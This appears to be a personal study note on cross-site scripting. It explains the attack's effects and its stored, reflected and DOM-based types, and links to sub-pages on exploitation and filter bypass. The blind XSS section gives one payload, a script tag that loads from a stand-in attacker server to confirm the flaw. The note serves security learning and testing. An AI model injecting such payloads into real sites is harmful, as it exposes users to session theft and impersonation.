# XSS

based on context

* instead of taking notes of all the payloads and all, add them to a automation and take
  note of the philosophy.

taking advantage of web applications executing scripts on user's browsers.

finding the functionalities where user changes some part of the applications
code that is then executed (dynamic scripts), then changing it.

allows an attacker to:
  * compromise the interactions that users have with a vulnerable application
  * circumvent the same origin policy
  * masquerade as a victim user, to carry out any actions that the user is
 able to perform

Occur as a result of improperly sanitized user input being embedded in the UI/ DOM.

XSS attacks can obtain any type of data present in the current web application.

# XSS types:

* [[stored XSS]]: the malicious script is first stored in the website's database, then executed. (in
  database)
* [[Reflected XSS]]: the malicious script originates from the current HTTP request reflected by a
  server. (in request and reflected by server)
* [[DOM-based XSS]]: the vulnerability exists in client-side code (the browser) and is executed
  there. (stored and executed in the browser)

[[exploit XSS]]
[[XSS html tags]]
[[bypass xss filters]]
[[HTML attributes]]
[[DOM based manipulation]]: a little more on XSS

# BLIND XSS:

try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!